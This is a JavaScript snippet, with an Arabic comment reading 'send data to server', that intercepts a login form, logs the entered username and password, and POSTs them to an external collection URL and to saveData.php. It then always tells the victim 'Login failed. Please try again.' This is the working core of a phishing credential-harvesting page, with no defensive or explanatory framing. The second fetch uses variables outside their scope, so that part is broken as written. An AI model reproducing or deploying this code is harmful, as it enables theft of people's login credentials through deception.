document.getElementById("login-form").addEventListener("submit", function (e) {
    e.preventDefault();

    const username = e.target.username.value;
    const password = e.target.password.value;

    console.log(`Username: ${username}, Password: ${password}`);

    // إرسال البيانات إلى سيرفر
    fetch("https://example.com/collect-data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
    })
    .then((response) => response.json())
    .then((data) => {
        console.log("Success:", data);
        alert("Login failed. Please try again.");
    })
    .catch((error) => {
        console.error("Error:", error);
    });
});
fetch("saveData.php", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
})
    .then((response) => response.json())
    .then((data) => {
        console.log("Data saved:", data);
        alert("Login failed. Please try again.");
    })
    .catch((error) => {
        console.error("Error:", error);
    });
